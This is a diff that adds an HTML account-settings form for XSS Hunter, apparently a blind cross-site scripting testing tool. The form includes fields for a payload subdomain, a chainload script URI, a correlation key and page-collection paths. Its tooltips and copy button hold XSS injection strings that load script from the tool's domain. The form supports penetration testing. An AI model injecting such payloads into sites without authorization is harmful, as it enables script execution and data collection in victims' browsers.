@@ -1,0 +1,97 @@
+<label for="full_name">Full Name</label><br>
+<input id="full_name" class="form-control" name="full_name" placeholder="John Doe" autofocus type="text">
+
+<label for="settings_password">Password</label><br>
+<input id="settings_password" class="form-control" name="password" placeholder="hunter2" type="password">
+
+<label for="email">Email</label><br>
+<input id="email" class="form-control" name="email" placeholder="hacker@thegibson.com" type="email">
+
+<label for="domain">Custom <code>{{domain}}</code> Subdomain <span title="XSS Payload Domain" data-toggle="popover" data-placement="top" data-content="Your custom XSS Hunter subdomain which identifies your injections. (<script src=//custom.{{domain}}</script>)" class="glyphicon glyphicon-question-sign" aria-hidden="true"></span>
+</label>
+<input id="domain" class="form-control" name="domain" placeholder="subdomain" type="text" readonly="readonly"/>
+
+<label for="chainload_uri">Additional JavaScript Payload URI <span title="Additional Payload URI" data-toggle="popover" data-placement="top" data-content="A remote URI with additional JavaScript to be loaded and executed. Please note that this endpoint must have the proper CORS headers to allow XMLHTTPRequest to retrieve it." class="glyphicon glyphicon-question-sign" aria-hidden="true"></span>
+</label>
+<input id="chainload_uri" class="form-control" name="chainload_uri" placeholder="https://secondary-payload.com/alertbox.js" type="text" />
+
+<label for="owner_correlation_key">Injection Correlation Key <span title="Injection Correlation Key" data-toggle="popover" data-placement="top" data-content="A secret key which can be used with an XSS Hunter compatible proxy program to correlate injections with XSS payloads fires. This allows an attacker to know exactly what request caused a specific payload fire." class="glyphicon glyphicon-question-sign" aria-hidden="true"></span>
+</label>
+<input readonly="readonly" id="owner_correlation_key" class="form-control" name="owner_correlation_key" placeholder="Loading injection key..." type="text" />
+<button type="button" class="copy_markdown_to_clipboard injection_correlation_key_copy btn btn-info btn-block" data-clipboard-text="&quot;><script src=https://x.{{domain}}></script>" data-clipboard-action="copy" data-clipboard-button="">
+    <span class="glyphicon glyphicon-share"></span> Copy Key to Clipboard
+</button>
+<br />
+<i>Note: Must be used with an <a target="_blank" href="https://github.com/mandatoryprogrammer/xsshunter_client">XSS Hunter compatible client tool, click here for an example.</a> If you want to build your own please see our <a href="https://github.com/mandatoryprogrammer/xsshunter_docs" target="_blank">documentation.</a></i> Note that injection requests are only stored for 30 days and are purged afterwards. You will still receive XSS alerts after 30 days but they won't be correlated.
+<br />
+<br />
+
+<label for="email_enabled">Email upon XSS payload fire?</label><br>
+<label class="email_enabled_toggle toggle">
+    <input id="email_enabled" type="checkbox" checked="">
+    <span class="handle"></span>
+</label>
+<br />
+<br />
+
+<label for="pgp-key">PGP Key <span title="PGP Key" data-toggle="popover" data-placement="top" data-content="For encrypting injection data client-side. If you add your public PGP key here then all XSS payload fire information will be encrypted in the victim's browser and will be sent you via email and not stored by XSS Hunter." class="glyphicon glyphicon-question-sign" aria-hidden="true"></span></label><br>
+<textarea id="pgp-key" name="pgp_key" class="form-control" rows="3" placeholder="-----BEGIN PGP PUBLIC KEY BLOCK-----
+    Comment: GPGTools - https://gpgtools.org
+
+    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
+    kMc=
+    =G9fE
+    -----END PGP PUBLIC KEY BLOCK-----
+    "></textarea>
+<br />
+
+<label for="page_collection_paths_list">Collect Page List <span title="Collect Page List" data-toggle="popover" data-placement="top" data-content="This is a list of relative paths for pages that the XSS Hunter payload will automatically retrieve and store upon your XSS payload firing. Useful for gaining more information about the vulnerable service and collecting further vulnerabilities (e.g. fetching /crossdomain.xml for bad Flash policies)." class="glyphicon glyphicon-question-sign" aria-hidden="true"></span></label><br>
+<textarea id="page_collection_paths_list" name="page_collection_paths_list" class="form-control" rows="3" placeholder="/crossdomain.xml&#13;&#10;/clientaccesspolicy.xml&#13;&#10;/robots.txt&#13;&#10;..."></textarea>
+<br />
+
+<button type="button" id="update_account_button" class="btn btn-primary btn-block">Update Settings</button>
